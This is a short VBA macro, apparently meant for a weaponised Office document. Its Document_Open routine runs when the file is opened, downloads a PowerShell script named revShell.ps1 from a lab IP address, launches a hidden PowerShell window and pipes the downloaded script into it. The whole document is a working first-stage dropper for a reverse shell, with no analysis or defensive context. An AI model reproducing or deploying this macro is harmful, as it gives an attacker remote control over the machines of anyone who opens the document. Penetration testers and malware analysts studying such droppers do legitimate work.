sub document_open()
	Dim url, http, stream, content
        Dim shell, command
        ' URL to Second Stage
        url = "http://192.168.235.128/evil/revShell.ps1"
	    
        ' Get revShell payload
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "GET", url, False
        http.send
        
        If http.Status <> 200 Then
            Exit Sub
        End If
	    
        content = http.responseText
	           
        ' Open new PowerShell
        Set shell = CreateObject("WScript.Shell")
        Set command = shell.Exec("powershell.exe -WindowStyle Hidden -NoLogo")
	
        ' send Payload to powershell one line at time
        command.StdIn.Write content & vbCrLf
	command.StdIn.Close	
End Sub
